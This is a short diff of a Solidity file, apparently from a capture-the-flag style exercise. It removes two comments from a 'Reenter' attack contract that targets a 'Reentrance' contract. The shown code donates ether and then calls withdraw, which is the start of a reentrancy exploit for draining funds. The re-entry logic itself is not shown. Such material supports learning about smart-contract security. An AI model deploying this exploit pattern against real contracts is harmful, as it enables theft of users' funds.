@@ -39,14 +39,14 @@ contract Reentrance {
 
 contract Reenter {
     Reentrance reentranceContract;
-    uint public amount = 1 ether;    //withdrawal amount
+    uint public amount = 1 ether;    
     
     constructor(address payable reentranceContactAddress) public payable {
         reentranceContract = Reentrance(reentranceContactAddress);
     }
 
 function initiateAttack() public {
-    reentranceContract.donate{value:amount}(address(this));//need to increase the balances account in order to pass the first if statement of the withdraw function
+    reentranceContract.donate{value:amount}(address(this));
     reentranceContract.withdraw(amount); 
   }
   
